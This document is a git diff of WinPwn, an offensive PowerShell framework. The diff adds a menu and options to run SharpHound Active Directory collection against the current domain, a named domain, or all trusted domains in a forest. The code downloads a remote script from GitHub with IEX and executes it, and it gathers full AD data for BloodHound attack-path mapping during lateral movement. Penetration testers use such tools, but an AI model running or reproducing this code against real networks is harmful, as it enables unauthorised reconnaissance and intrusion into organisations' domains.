@@ -1959,7 +1959,7 @@ __        ___       ____
     {
         reconAD
         generaldomaininfo -noninteractive 
-        sharphound 
+        sharphound -noninteractive 
         IEX($viewdevobfs)
         Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"
         shareenumeration
@@ -2031,7 +2031,7 @@ __        ___       ____
         {
              1{generaldomaininfo}
              2{reconAD}
-             3{Sharphound}
+             3{SharpHoundMenu}
              4{IEX($viewdevobfs)
              Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
              5{shareenumeration}
@@ -3059,12 +3059,47 @@ function Get-currentIP
     return $IPaddress
 }
 
+function SharpHoundMenu
+{
+  @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> SharpHoundMenu
+
+'@
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Run SharpHound for the current domain!'
+        Write-Host -ForegroundColor Green '2. Run SharpHound for another domain! '
+        Write-Host -ForegroundColor Green '3. Run SharpHound for all trusted domains! '
+        Write-Host -ForegroundColor Green '4. Go back '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{Sharphound -noninteractive}
+             2{SharpHound}
+             3{SharpHound -alltrustedomains}
+       }
+    }
+  While ($masterquestion -ne 4)
+
+}
+
 function Sharphound
 {
   <#
         .DESCRIPTION
         Downloads Sharphound.exe and collects All AD-Information for Bloodhound https://github.com/BloodHoundAD
-        Author: @S3cur3Th1sSh1t
+        Author: @S3cur3Th1sSh1t, @Luemmelsec
         License: BSD 3-Clause
     #>
     #Domain Recon / Lateral Movement Phase
@@ -3072,7 +3107,9 @@ function Sharphound
         [Switch]
         $noninteractive,
         [Switch]
-        $consoleoutput   
+        $consoleoutput,
+        [Switch]
+        $alltrustedomains   
     )
     $Wcl = new-object System.Net.WebClient
     $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
@@ -3082,7 +3119,26 @@ function Sharphound
     
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharphound3.ps1')
     Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
-    Invoke-Sharphound3
+    
+    if ($noninteractive)
+    {
+        Invoke-Sharphound3 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+    }
+    elseif($alltrustedomains)
+    {
+        IEX($admodule)
+        $TrustedDomains = (Get-ADForest).Domains
+        foreach ($TrustedDomain in $TrustedDomains)
+        {
+            Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath"
+        }
+        
+    }
+    else
+    {
+        $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from: '
+        Invoke-Sharphound3 -command "-c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath"
+    }
 }
 
 function oldchecks
